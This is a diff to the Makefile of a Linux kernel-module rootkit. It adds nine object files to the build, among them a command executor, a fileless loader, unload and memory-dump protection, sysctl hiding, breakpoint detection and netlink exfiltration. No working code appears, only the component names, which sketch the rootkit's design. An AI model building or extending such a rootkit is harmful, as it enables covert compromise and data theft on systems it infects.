@@ -21,7 +21,16 @@ rootkit-objs := \
 	src/anti_forensics.o \
 	src/packet_filter.o \
 	src/anti_watchdog.o \
-	src/vfs_file_hiding.o
+	src/vfs_file_hiding.o \
+	src/command_executor.o \
+	src/delayed_activation.o \
+	src/fileless_loader.o \
+	src/self_watchdog.o \
+	src/unload_protection.o \
+	src/anti_memdump.o \
+	src/sysctl_hiding.o \
+	src/breakpoint_detector.o \
+	src/netlink_exfil.o
 
 KDIR := /lib/modules/$(shell uname -r)/build
 PWD := $(shell pwd)
